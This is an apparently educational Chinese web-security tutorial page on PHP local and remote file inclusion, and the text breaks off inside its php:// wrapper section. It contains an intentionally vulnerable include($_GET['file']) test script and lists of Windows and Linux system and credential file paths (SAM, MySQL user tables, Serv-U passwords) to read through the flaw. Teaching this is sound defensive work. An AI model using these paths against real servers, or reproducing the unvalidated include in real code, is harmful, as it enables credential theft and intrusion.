<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-docs-web docs-doc-id-常见漏洞类型/文件包含">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.20">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="TnT安全知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="TnT安全知识库 Atom Feed"><title data-rh="true">文件包含 | TnT安全知识库</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://TnT-Security-Lab.github.io/docs-web/常见漏洞类型/文件包含"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="keywords" content="Gungnir, urdr-gungnir, TnT, TnT-security-lab, blog, javascript, typescript, python ,node, react, vue, web, 前端, 后端"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-docs-web-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-docs-web-current"><meta data-rh="true" property="og:title" content="文件包含 | TnT安全知识库"><meta data-rh="true" name="description" content="漏洞原理"><meta data-rh="true" property="og:description" content="漏洞原理"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://TnT-Security-Lab.github.io/docs-web/常见漏洞类型/文件包含"><link data-rh="true" rel="alternate" href="https://TnT-Security-Lab.github.io/docs-web/常见漏洞类型/文件包含" hreflang="en"><link data-rh="true" rel="alternate" href="https://TnT-Security-Lab.github.io/docs-web/常见漏洞类型/文件包含" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.10714433.css">
<link rel="preload" href="/assets/js/runtime~main.3c62fd08.js" as="script">
<link rel="preload" href="/assets/js/main.6dd2dae4.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="TnT" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/img/logo.svg" alt="TnT" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title text--truncate">TnT</b></a><a class="navbar__item navbar__link" href="/docs/intro">投稿教程</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs-web/Intro">WEB安全</a><a class="navbar__item navbar__link" href="/docs-binary/Intro">二进制安全</a><a class="navbar__item navbar__link" href="/docs-ctf/Intro">CTF</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/blog">关于我们</a><a href="https://github.com/TnT-Security-Lab" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_dLyj"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docsWrapper_mKqt"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><div class="docPage_ualW"><aside class="theme-doc-sidebar-container docSidebarContainer_UQUJ"><div class="sidebar_RiAD"><nav class="menu thin-scrollbar menu_izAj"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs-web/intro">Web安全模块</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/docs-web/常见漏洞类型/sql注入">常见漏洞类型</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs-web/常见漏洞类型/sql注入">sql注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs-web/常见漏洞类型/文件包含">文件包含</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs-web/语言与框架/Java/基础知识/JVM">语言与框架</a></div></li></ul></nav></div></aside><main class="docMainContainer_uL0j"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Xlws" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_kU5B"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">常见漏洞类型</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">文件包含</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_bZGK theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_l22C">On this page</button></div><div class="theme-doc-markdown markdown"><h1>文件包含</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="漏洞原理">漏洞原理<a class="hash-link" href="#漏洞原理" title="Direct link to heading">​</a></h2><blockquote><p>由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入</p></blockquote><ul><li><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含，<strong>类似于C语言调用头文件的原理</strong></p></li><li><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用</p></li><li><p>但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p></li><li><p>所有存在引用文件的函数的语言都可能存在文件包含漏洞</p></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="危险函数">危险函数<a class="hash-link" href="#危险函数" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="php">php<a class="hash-link" href="#php" title="Direct link to heading">​</a></h3><ul><li><p>include()</p></li><li><p>include_once()</p></li><li><p>fopen()</p></li><li><p>require()</p></li><li><p>require_once() </p></li></ul><p><strong>php主流类型</strong></p><ul><li><p>include() :执行到include()才包含文件，找不到包含文件<strong>只会产生警告</strong>，还会<strong>接着运行</strong>后面的脚本</p></li><li><p>require(): 只要程序<strong>一运行就会包含文件</strong>，找不到包含文件则会产生致命错误，并且脚本<strong>运行终止</strong></p></li><li><p>include_once()和require_once()：如文件包含被运行了，则不会运行第二次</p></li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="jspservlet">jsp/Servlet<a class="hash-link" href="#jspservlet" title="Direct link to heading">​</a></h3><ul><li>ava.io</li><li>file()</li><li>java.io</li><li>filereader()</li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="asp">asp<a class="hash-link" href="#asp" title="Direct link to heading">​</a></h3><ul><li>include  file</li><li>include  virtual</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="php文件包含">PHP文件包含<a class="hash-link" href="#php文件包含" title="Direct link to heading">​</a></h2><p><strong>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</strong></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="lfilocal-file-inclusion漏洞"><strong>LFI(Local File Inclusion)漏洞</strong><a class="hash-link" href="#lfilocal-file-inclusion漏洞" title="Direct link to heading">​</a></h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p><p>这个漏洞不受<code>allow_url_fopen = On</code>和<code>allow_url_include = On</code>这两个的影响。</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="rfiremote-file-inclusion漏洞"><strong>RFI(Remote File Inclusion)漏洞</strong><a class="hash-link" href="#rfiremote-file-inclusion漏洞" title="Direct link to heading">​</a></h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。
但RFI的利用条件较为苛刻，需要php.ini中进行配置</p><ol><li><code>allow_url_fopen = On</code></li><li><code>allow_url_include = On</code></li></ol><p>两个配置选项均需要为On，才能远程包含文件成功。</p><p><strong>以下测试环境为</strong></p><ol><li><p><code>allow_url_fopen = On</code></p></li><li><p><code>allow_url_include = Off</code></p></li><li><p><code>fileinclude.php</code></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = $_GET[&quot;file&quot;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include($file);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li></ol><h3 class="anchor anchorWithStickyNavbar_mojV" id="搜寻敏感文件的绝对路径">搜寻敏感文件的绝对路径<a class="hash-link" href="#搜寻敏感文件的绝对路径" title="Direct link to heading">​</a></h3><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">WINDOWS下:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/boot.ini //查看系统版本</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/windows/php.ini //php配置信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/winnt/php.ini</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/winnt/my.ini</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\win.ini  //用于保存系统配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\Program Files\Serv-U\ServUDaemon.ini</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//存储了pcAnywhere的登陆密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d:\APACHE\Apache2\conf\httpd.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Program Files\mysql\my.ini</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">LUNIX/UNIX 下:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/apache2/conf/httpd.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/iptables //从中得到防火墙规则策略</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/httpd/conf/httpd.conf // apache配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/rsyncd.conf //同步程序配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/my.cnf //mysql的配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/redhat-release //系统版本</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/issue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/issue.net</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/iptables 查看防火墙策略</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="表单编码方式enctype">表单编码方式enctype<a class="hash-link" href="#表单编码方式enctype" title="Direct link to heading">​</a></h3><table><thead><tr><th align="center">编码方式</th><th align="center">适用类型</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">application/x-www-form-urlencoded</td><td align="center">默认值，允许将普通字符和特殊字符提交给服务器，文件不行</td><td align="center">a-Z,!@#$^&amp;*(,1-0，❤❥웃유♋☮</td></tr><tr><td align="center">multipart/form-data</td><td align="center">允许提交 文件,会影响普通上传数据</td><td align="center">JPG,GIF,EXE,RAR</td></tr><tr><td align="center">text/plain</td><td align="center">只允许进行普通字符的提交，特殊字符无法提交</td><td align="center">a-Z,1234567890，?,=,&amp;</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_mojV" id="php特殊字符">php特殊字符<a class="hash-link" href="#php特殊字符" title="Direct link to heading">​</a></h3><h4 class="anchor anchorWithStickyNavbar_mojV" id="数组运算符">数组运算符<a class="hash-link" href="#数组运算符" title="Direct link to heading">​</a></h4><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">x + y</td><td align="left">集合</td><td align="left">x 和 y 的集合</td></tr><tr><td align="left">x == y</td><td align="left">相等</td><td align="left">如果 x 和 y 具有相同的键/值对，则返回 true</td></tr><tr><td align="left">x === y</td><td align="left">恒等</td><td align="left">如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true</td></tr><tr><td align="left">x != y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x &lt;<!-- -->&gt;<!-- --> y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x !== y</td><td align="left">不恒等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr></tbody></table><h4 class="anchor anchorWithStickyNavbar_mojV" id="特殊意义符">特殊意义符<a class="hash-link" href="#特殊意义符" title="Direct link to heading">​</a></h4><table><thead><tr><th align="center">.</th><th align="center">字符串连接符</th><th align="center">字符串连接符号，可以用于连接任意字符串</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">报错阻断符</td><td align="center">阻断@后的php语句的报错题型</td></tr><tr><td align="center">&#x27; &#x27;和&quot; &quot;</td><td align="center">但双引号</td><td align="center">单引号内所有字符均为普通字符，变量名字和通配符失去其内在含义，双引号内语句可以经过解释和转化，通配符和变量名正常使用</td></tr><tr><td align="center">??</td><td align="center">NULL合并运算符（PHP7+）</td><td align="center">??前的php语句返回值<strong>不存在</strong>则返回??后面的值，如果存在则返回正常应该返回的值，用于替代返回NULL的情况</td></tr><tr><td align="center">&lt;=&gt;</td><td align="center">组合比较符（PHP7+）</td><td align="center">PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 <strong>&lt;=&gt;</strong>。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较,可以根据判断结果快速为一个变量进行赋值</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_mojV" id="php伪协议">php伪协议<a class="hash-link" href="#php伪协议" title="Direct link to heading">​</a></h3><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 </p><p><code>fopen()</code>、</p><p> <code>copy()</code>、</p><p><code>file_exists()</code> </p><p> <code>filesize()</code> 的文件系统函数。 </p><p>除了这些封装协议，还能通过 <code>stream_wrapper_register()</code> 来注册自定义的封装协议。</p><p><code>php:的含义</code></p><p><code>指示支持该函数的最早的 PHP 版本。</code></p><h4 class="anchor anchorWithStickyNavbar_mojV" id="相关函数">相关函数<a class="hash-link" href="#相关函数" title="Direct link to heading">​</a></h4><h5 class="anchor anchorWithStickyNavbar_mojV" id="fopen"><code>fopen()</code><a class="hash-link" href="#fopen" title="Direct link to heading">​</a></h5><ul><li><p>fopen() 函数打开一个文件或 URL。</p></li><li><p><strong>如果 fopen() 失败，它将返回 FALSE 并附带错误信息</strong></p></li><li><p>您可以通过在函数名前面添加一个 &#x27;@&#x27; 来隐藏错误输出。</p></li><li><p>成功打开会返回<strong>文件流</strong></p></li></ul><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fopen(filename,mode,include_path,context)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 